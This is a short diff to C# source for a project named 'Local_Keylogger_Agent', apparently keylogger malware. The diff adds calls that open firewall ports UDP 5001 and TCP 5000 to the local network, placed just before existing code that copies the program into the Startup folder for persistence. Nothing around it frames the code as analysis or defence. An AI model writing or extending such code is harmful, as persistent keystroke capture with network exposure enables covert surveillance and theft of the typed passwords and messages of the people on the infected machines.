@@ -12,6 +12,9 @@ namespace Local_Keylogger_Agent
 
             Storage storage = new Storage();
 
+            FirewallHelper.EnsureUdpPort("Agent Discovery UDP 5001", 5001, "Allow discovery UDP 5001 from LAN");
+            FirewallHelper.EnsureTcpPort("Agent HTTP TCP 5000", 5000, "Allow HTTP TCP 5000 from LAN");
+
             SelfCopy selfCopy = new SelfCopy();
             selfCopy.CopySelfToStartup();
 
